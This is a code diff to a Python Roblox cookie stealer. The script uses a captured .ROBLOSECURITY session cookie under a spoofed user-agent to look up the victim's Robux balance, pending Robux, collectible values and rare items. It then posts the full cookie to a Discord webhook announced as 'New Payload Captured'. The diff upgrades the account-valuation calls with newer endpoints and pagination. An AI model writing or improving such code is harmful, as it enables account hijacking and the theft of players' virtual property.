@@ -56,7 +56,6 @@ def main():
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
-        # Spoofed user-agent matching WinINet requirement
         headers = { 
             "Cookie": f".ROBLOSECURITY={roblosecurity}",
             "User-Agent": "Roblox/WinINet",
@@ -108,17 +107,33 @@ def main():
             if economy_data:
                 robux_balance = economy_data.get("robux", 0)
 
-            # 2. Fetch Pending Robux
-            totals_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary", headers)
+            # 2. Fetch Pending Robux (Using updated transaction-totals schema)
+            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
             if totals_data:
                 pending_robux = totals_data.get("pendingRobux", 0)
+            else:
+                # Fallback alternative endpoint if v2 fails
+                alt_totals = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/resale-stock", headers)
+                # Keep pending_robux as retrieved or 0 if unavailable
 
-            # 3. Collectibles & RAP Calculation
-            collectibles_data = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100", headers)
-            if collectibles_data and "data" in collectibles_data:
+            # 3. Collectibles & RAP Calculation (Using Inventory v2 collectibles endpoint with pagination cursor support)
+            cursor = ""
+            for _ in range(5):  # Support up to 500 limited items
+                col_url = f"https://inventory.roblox.com/v2/users/{user_id}/inventory/collectibles?limit=100&sortOrder=Asc"
+                if cursor:
+                    col_url += f"&cursor={cursor}"
+                
+                collectibles_data = safe_get(col_url, headers)
+                if not collectibles_data or "data" not in collectibles_data:
+                    break
+
                 for item in collectibles_data["data"]:
                     total_rap += item.get("recentAveragePrice", 0)
                     limiteds_count += 1
+
+                cursor = collectibles_data.get("nextPageCursor")
+                if not cursor:
+                    break
 
             # 4. Korblox & Headless Ownership Check (Asset IDs)
             korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/48545806", headers)
@@ -139,7 +154,6 @@ def main():
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
-        # Formatted Discord Payload matching dashboard design
         payload = {
             "content": f"@everyone New Payload Captured from **{username}**!",
             "username": f"{username} | RBXDEV Bot",
